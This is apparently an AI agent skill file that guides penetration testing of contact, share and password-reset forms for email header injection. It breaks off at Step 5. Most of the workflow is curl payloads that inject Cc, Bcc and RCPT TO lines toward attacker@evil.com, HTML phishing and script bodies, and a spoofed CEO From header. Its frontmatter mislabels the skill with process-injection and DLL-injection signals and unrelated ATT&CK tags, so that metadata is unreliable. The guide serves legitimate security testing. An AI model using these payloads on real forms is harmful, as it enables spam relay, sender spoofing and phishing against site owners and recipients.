---
name: testing-for-email-header-injection
description: "Tests web application email functionality. Signals: process injection, DLL injection, memory execution."
zh-signals: "Tests web application email functionality (contact forms, password reset) 信号:进程注入,dll注入,内存执行。"
when-to-use: Tests web application email functionality (contact forms, password reset,
  newsletter subscriptions) for CRLF/SMTP header injection using Burp Suite and OWASP ZAP,
  checking whether attackers can inject headers, modify recipients, or abuse forms for
  spam relay. Use when testing any user-input-driven email-sending feature during a
  penetration test.
domain: cybersecurity
subdomain: web-application-security
tags:
- email-injection
- smtp-injection
- crlf-injection
- header-injection
- spam-relay
- contact-form
- email-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1055
---

# Testing for Email Header Injection

## When to Use
- When testing contact forms, feedback forms, or "email a friend" functionality
- During assessment of password reset email functionality
- When testing newsletter subscription or notification email systems
- During penetration testing of applications that send emails based on user input
- When auditing email-related API endpoints for header injection

## Prerequisites
- Burp Suite for intercepting and modifying HTTP requests
- Understanding of SMTP protocol and email header structure
- Knowledge of CRLF injection techniques (\r\n sequences)
- Test email accounts for receiving injected emails
- Access to application features that trigger email sending
- SMTP server logs access for monitoring injection attempts

## Workflow

### Step 1 — Identify Email Injection Points
```bash
# Identify form fields that end up in email headers:
# - "From" name or email address fields
# - "To" or "CC" fields in sharing features
# - Subject line inputs
# - Reply-To fields

# Common endpoints:
# POST /contact - Contact forms
# POST /share - Share via email features
# POST /invite - Invitation systems
# POST /api/send-email - Email API endpoints
# POST /forgot-password - Password reset forms

# Test basic functionality first
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com&subject=Hello&message=Test message"
```

### Step 2 — Test for CRLF Header Injection
```bash
# Inject additional email headers via CRLF in the email field
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com%0ACc:attacker@evil.com&message=Test"

# Inject BCC header
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com%0ABcc:attacker@evil.com&message=Test"

# Inject via the name field
curl -X POST http://target.com/contact \
  -d "name=Test%0ACc:attacker@evil.com&email=test@test.com&message=Test"

# Inject via subject field
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com&subject=Hello%0ABcc:attacker@evil.com&message=Test"

# Try different CRLF encoding variants
# %0D%0A (CRLF)
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0D%0ACc:attacker@evil.com"

# %0A (LF only)
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0ACc:attacker@evil.com"

# %0D (CR only)
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0DCc:attacker@evil.com"

# Double encoding
curl -X POST http://target.com/contact \
  -d "email=test@test.com%250ACc:attacker@evil.com"
```

### Step 3 — Inject Custom Email Content
```bash
# Override email body by injecting Content-Type and body
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>"

# Inject additional MIME parts
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AContent-Type:multipart/mixed;boundary=boundary123%0A--boundary123%0AContent-Type:text/html%0A%0A<script>alert(1)</script>"

# Override From header for email spoofing
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AFrom:ceo@target.com"

# Inject Reply-To for phishing
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AReply-To:attacker@evil.com"
```

### Step 4 — Test IMAP/SMTP Injection
```bash
# IMAP command injection via email field
curl -X POST http://target.com/webmail/search \
  -d "query=test%0AEXAMINE INBOX"

# SMTP command injection
curl -X POST http://target.com/api/send \
  -d "to=test@test.com%0ARCPT TO:attacker@evil.com"

# SMTP VRFY command injection
curl -X POST http://target.com/api/verify \
  -d "email=test@test.com%0AVRFY admin"

# Test SMTP relay abuse
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0ATo:victim1@target.com%0ATo:victim2@target.com%0ATo:victim3@target.com"
```

### Step 5 — Test JSON-Based Email APIs
```bash

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
